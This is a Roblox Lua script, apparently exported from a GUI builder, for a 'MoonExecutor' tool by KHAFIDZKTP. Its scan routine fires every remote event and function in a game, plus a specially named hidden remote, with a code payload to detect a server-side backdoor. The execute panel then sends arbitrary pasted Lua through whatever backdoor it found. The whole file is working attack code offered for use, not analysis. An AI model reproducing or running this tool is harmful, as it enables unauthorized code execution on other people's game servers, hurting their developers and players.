-- Instances: 22 | Scripts: 2 | Modules: 0 | Tags: 0
local LMG2L = {};

-- Players.KHAFIDZKTP.PlayerGui.ScreenGui
LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame
LMG2L["MenuInjectFrame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MenuInjectFrame_2"]["BorderSizePixel"] = 0;
LMG2L["MenuInjectFrame_2"]["BackgroundColor3"] = Color3.fromRGB(6, 20, 57);
LMG2L["MenuInjectFrame_2"]["Size"] = UDim2.new(0.4043, 0, 0.39197, 0);
LMG2L["MenuInjectFrame_2"]["Position"] = UDim2.new(0.30586, 0, 0.29704, 0);
LMG2L["MenuInjectFrame_2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["MenuInjectFrame_2"]["Name"] = [[MenuInjectFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UICorner
LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["MenuInjectFrame_2"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_4"] = Instance.new("UIAspectRatioConstraint", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIAspectRatioConstraint_4"]["AspectRatio"] = 1.79688;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.MoonExecutorText
LMG2L["MoonExecutorText_5"] = Instance.new("TextLabel", LMG2L["MenuInjectFrame_2"]);
LMG2L["MoonExecutorText_5"]["TextWrapped"] = true;
LMG2L["MoonExecutorText_5"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutorText_5"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutorText_5"]["TextScaled"] = true;
LMG2L["MoonExecutorText_5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutorText_5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutorText_5"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutorText_5"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutorText_5"]["Size"] = UDim2.new(0.99565, 0, 0.17969, 0);
LMG2L["MoonExecutorText_5"]["Text"] = [[MoonExecutor]];
LMG2L["MoonExecutorText_5"]["Name"] = [[MoonExecutorText]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning 
LMG2L["Scanning _6"] = Instance.new("TextButton", LMG2L["MenuInjectFrame_2"]);
LMG2L["Scanning _6"]["TextWrapped"] = true;
LMG2L["Scanning _6"]["TextStrokeTransparency"] = 0;
LMG2L["Scanning _6"]["RichText"] = true;
LMG2L["Scanning _6"]["BorderSizePixel"] = 0;
LMG2L["Scanning _6"]["TextScaled"] = true;
LMG2L["Scanning _6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Scanning _6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["Scanning _6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Scanning _6"]["Size"] = UDim2.new(0.7913, 0, 0.58594, 0);
LMG2L["Scanning _6"]["Text"] = [[Scan Now]];
LMG2L["Scanning _6"]["Name"] = [[Scanning ]];
LMG2L["Scanning _6"]["Position"] = UDim2.new(0.11304, 0, 0.21875, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UICorner
LMG2L["UICorner_7"] = Instance.new("UICorner", LMG2L["Scanning _6"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
LMG2L["ScanScript_8"] = Instance.new("LocalScript", LMG2L["Scanning _6"]);
LMG2L["ScanScript_8"]["Name"] = [[ScanScript]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .UIStroke
LMG2L["UIStroke_9"] = Instance.new("UIStroke", LMG2L["Scanning _6"]);
LMG2L["UIStroke_9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_9"]["Color"] = Color3.fromRGB(227, 12, 237);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.UIStroke
LMG2L["UIStroke_a"] = Instance.new("UIStroke", LMG2L["MenuInjectFrame_2"]);
LMG2L["UIStroke_a"]["Color"] = Color3.fromRGB(255, 0, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame
LMG2L["MainFrame_b"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
LMG2L["MainFrame_b"]["Visible"] = false;
LMG2L["MainFrame_b"]["BorderSizePixel"] = 0;
LMG2L["MainFrame_b"]["BackgroundColor3"] = Color3.fromRGB(85, 85, 85);
LMG2L["MainFrame_b"]["Size"] = UDim2.new(0.50977, 0, 0.54815, 0);
LMG2L["MainFrame_b"]["Position"] = UDim2.new(0.24961, 0, 0.25723, 0);
LMG2L["MainFrame_b"]["Name"] = [[MainFrame]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.Versi
LMG2L["Versi_c"] = Instance.new("TextLabel", LMG2L["MainFrame_b"]);
LMG2L["Versi_c"]["TextWrapped"] = true;
LMG2L["Versi_c"]["BorderSizePixel"] = 0;
LMG2L["Versi_c"]["TextTransparency"] = 0.6;
LMG2L["Versi_c"]["TextScaled"] = true;
LMG2L["Versi_c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Versi_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Zekton.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Versi_c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Versi_c"]["BackgroundTransparency"] = 1;
LMG2L["Versi_c"]["RichText"] = true;
LMG2L["Versi_c"]["Size"] = UDim2.new(0.11379, 0, 0.0838, 0);
LMG2L["Versi_c"]["Text"] = [[v0.0.1]];
LMG2L["Versi_c"]["Name"] = [[Versi]];
LMG2L["Versi_c"]["Position"] = UDim2.new(0.87931, 0, 0.90503, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UICorner
LMG2L["UICorner_d"] = Instance.new("UICorner", LMG2L["MainFrame_b"]);
LMG2L["UICorner_d"]["CornerRadius"] = UDim.new(0.01, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UIAspectRatioConstraint
LMG2L["UIAspectRatioConstraint_e"] = Instance.new("UIAspectRatioConstraint", LMG2L["MainFrame_b"]);
LMG2L["UIAspectRatioConstraint_e"]["AspectRatio"] = 1.62011;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ScrollingFrame
LMG2L["ScrollingFrame_f"] = Instance.new("ScrollingFrame", LMG2L["MainFrame_b"]);
LMG2L["ScrollingFrame_f"]["BorderSizePixel"] = 0;
LMG2L["ScrollingFrame_f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ScrollingFrame_f"]["Size"] = UDim2.new(0.8931, 0, 0.93855, 0);
LMG2L["ScrollingFrame_f"]["Position"] = UDim2.new(0.06552, 0, -0.12849, 0);
LMG2L["ScrollingFrame_f"]["BackgroundTransparency"] = 1;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ScrollingFrame.UICorner
LMG2L["UICorner_10"] = Instance.new("UICorner", LMG2L["ScrollingFrame_f"]);
LMG2L["UICorner_10"]["CornerRadius"] = UDim.new(0, 5);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ScrollingFrame.CoderBox
LMG2L["CoderBox_11"] = Instance.new("TextBox", LMG2L["ScrollingFrame_f"]);
LMG2L["CoderBox_11"]["Name"] = [[CoderBox]];
LMG2L["CoderBox_11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["CoderBox_11"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CoderBox_11"]["BorderSizePixel"] = 0;
LMG2L["CoderBox_11"]["TextWrapped"] = true;
LMG2L["CoderBox_11"]["TextSize"] = 18;
LMG2L["CoderBox_11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["CoderBox_11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["CoderBox_11"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["CoderBox_11"]["RichText"] = true;
LMG2L["CoderBox_11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["CoderBox_11"]["MultiLine"] = true;
LMG2L["CoderBox_11"]["PlaceholderText"] = [[Paste Your Script Here!]];
LMG2L["CoderBox_11"]["Size"] = UDim2.new(0.84828, 0, 0.65922, 0);
LMG2L["CoderBox_11"]["Position"] = UDim2.new(0.08621, 0, 0.12291, 0);
LMG2L["CoderBox_11"]["Text"] = [[Paste Your Script Here]];


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.UIStroke
LMG2L["UIStroke_12"] = Instance.new("UIStroke", LMG2L["MainFrame_b"]);
LMG2L["UIStroke_12"]["Thickness"] = 7;


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton
LMG2L["ExecuteButton_13"] = Instance.new("TextButton", LMG2L["MainFrame_b"]);
LMG2L["ExecuteButton_13"]["TextWrapped"] = true;
LMG2L["ExecuteButton_13"]["BorderSizePixel"] = 0;
LMG2L["ExecuteButton_13"]["TextScaled"] = true;
LMG2L["ExecuteButton_13"]["TextColor3"] = Color3.fromRGB(22, 255, 19);
LMG2L["ExecuteButton_13"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
LMG2L["ExecuteButton_13"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["ExecuteButton_13"]["Size"] = UDim2.new(0.18276, 0, 0.10615, 0);
LMG2L["ExecuteButton_13"]["Text"] = [[Execute]];
LMG2L["ExecuteButton_13"]["Name"] = [[ExecuteButton]];
LMG2L["ExecuteButton_13"]["Position"] = UDim2.new(0.0931, 0, 0.85475, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.UICorner
LMG2L["UICorner_14"] = Instance.new("UICorner", LMG2L["ExecuteButton_13"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.LocalScript
LMG2L["LocalScript_15"] = Instance.new("LocalScript", LMG2L["ExecuteButton_13"]);



-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.MoonExecutor
LMG2L["MoonExecutor_16"] = Instance.new("TextLabel", LMG2L["MainFrame_b"]);
LMG2L["MoonExecutor_16"]["TextWrapped"] = true;
LMG2L["MoonExecutor_16"]["TextStrokeTransparency"] = 0;
LMG2L["MoonExecutor_16"]["BorderSizePixel"] = 0;
LMG2L["MoonExecutor_16"]["TextScaled"] = true;
LMG2L["MoonExecutor_16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MoonExecutor_16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["MoonExecutor_16"]["TextColor3"] = Color3.fromRGB(252, 15, 47);
LMG2L["MoonExecutor_16"]["BackgroundTransparency"] = 1;
LMG2L["MoonExecutor_16"]["Size"] = UDim2.new(0.78966, 0, 0.12849, 0);
LMG2L["MoonExecutor_16"]["Text"] = [[MoonExecutor]];
LMG2L["MoonExecutor_16"]["Name"] = [[MoonExecutor]];
LMG2L["MoonExecutor_16"]["Position"] = UDim2.new(0.11379, 0, -0.00559, 0);


-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
local function C_8()
	local script = LMG2L["ScanScript_8"];
	local button = script.Parent	
	local player = game.Players.LocalPlayer	
	local playerGui = player:WaitForChild("PlayerGui")	
	
	local isScanning = false	
	
	local function runRemote(remote, data)	
		if remote:IsA("RemoteEvent") then	
			remote:FireServer(data)	
		elseif remote:IsA("RemoteFunction") then	
			task.spawn(function() remote:InvokeServer(data) end)	
		end	
	end	
	
	local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}	
	local function generateName(length)	
		local text = ""	
		for i = 1, length do	
			text = text .. alphabet[math.random(1, #alphabet)]	
		end	
		return text	
	end	
	
	local function findBackdoor()	
		local remotes = {}	
	
		local protected = game:GetService("ReplicatedStorage"):FindFirstChild("lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId)	
		if protected and protected:IsA("RemoteFunction") then	
			local code = generateName(math.random(12, 30))	
			task.spawn(function()	
				protected:InvokeServer("lalol", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			end)	
			remotes[code] = protected	
		end	
	
		for _, remote in game:GetDescendants() do	
			if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then continue end	
			if string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then continue end	
	
			local rs = game:GetService("ReplicatedStorage")	
			if remote.Parent == rs or remote.Parent.Parent == rs or remote.Parent.Parent.Parent == rs then	
				if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then continue end	
				if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then continue end	
				if remote.Parent.Name == "DefaultChatSystemChatEvents" then continue end	
			end	
	
			local code = generateName(math.random(12, 30))	
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")	
			remotes[code] = remote	
		end	
	
		for i = 1, 100 do	
			for code, remote in remotes do	
				if workspace:FindFirstChild(code) then	
					return remote	
				end	
			end	
			task.wait()	
		end	
	
		return nil	
	end	
	
	button.MouseButton1Click:Connect(function()	
		if isScanning then return end	
		isScanning = true	
	
		button.TextColor3 = Color3.fromRGB(255, 255, 255)	
	
		local startTime = tick()	
		task.spawn(function()	
			while isScanning and (tick() - startTime) < 5 do	
				button.Text = "Scan." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan.." task.wait(0.4)	
				if not isScanning then break end	
				button.Text = "Scan..." task.wait(0.4)	
			end	
		end)	
	
		local backdoor = findBackdoor()	
	
		local screenGui = button:FindFirstAncestorOfClass("ScreenGui")	
		local mainFrame = screenGui and screenGui:FindFirstChild("MainFrame")	
		local menuInjectFrame = button.Parent	
	
		isScanning = false	
	
		if backdoor and mainFrame then	
			_G.MoonBackdoor = backdoor	
	
			button.Text = "Found!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
	
			task.wait(0.5)	
	
			local hint = Instance.new("Hint")	
			hint.Text = "Thanks for using my executor! | By KHAFIDZKTP"	
			hint.Parent = player.Character	
	
			mainFrame.Visible = true	
			menuInjectFrame.Visible = false	
	
			task.wait(5)	
			hint:Destroy()	
		else	
			button.TextColor3 = Color3.fromRGB(255, 0, 0)	
			if not backdoor then	
				button.Text = "No Backdoor Found :("	
			else	
				button.Text = "MainFrame Not Found :("	
			end	
		end	
	end)	
end;
task.spawn(C_8);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.ExecuteButton.LocalScript
local function C_15()
	local script = LMG2L["LocalScript_15"];
	local button = script.Parent	
	local mainFrame = button.Parent.Parent -- ExecuteButton > MainFrame	
	
	-- CoderBox sekarang di dalam ScrollingFrame	
	local scrollFrame = mainFrame:WaitForChild("ScrollingFrame")	
	local coderBox = scrollFrame:WaitForChild("CoderBox")	
	
	local player = game.Players.LocalPlayer	
	
	button.MouseButton1Click:Connect(function()	
		-- Ambil backdoor dari _G (di-set oleh ScanScript setelah Found)	
		local backdoor = _G.MoonBackdoor	
			
		if not backdoor then	
			button.Text = "No Backdoor!"	
			button.TextColor3 = Color3.fromRGB(255, 80, 80)	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
			return	
		end	
	
		-- Ambil kode & replace %%username%%	
		local code = string.gsub(coderBox.Text, "%%username%%", player.Name)	
	
		if code ~= "" then	
			button.Text = "Running..."	
			button.TextColor3 = Color3.fromRGB(255, 255, 0)	
	
			-- Kirim ke server (sama seperti LALOL — raw code atau require langsung dikirim)	
			if backdoor:IsA("RemoteEvent") then	
				backdoor:FireServer(code)	
			elseif backdoor:IsA("RemoteFunction") then	
				task.spawn(function()	
					local ok, result = pcall(function()	
						return backdoor:InvokeServer(code)	
					end)	
					if result then	
						warn("[MoonExecutor] Server response: " .. tostring(result))	
					end	
				end)	
			end	
	
			task.wait(0.5)	
			button.Text = "Executed!"	
			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
	
			task.wait(1.5)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		else	
			button.Text = "Empty Code!"	
			button.TextColor3 = Color3.fromRGB(255, 100, 100)	
			task.wait(1)	
			button.Text = "Execute"	
			button.TextColor3 = Color3.fromRGB(255, 255, 255)	
		end	
	end)	
end;
task.spawn(C_15);

return LMG2L["ScreenGui_1"], require;
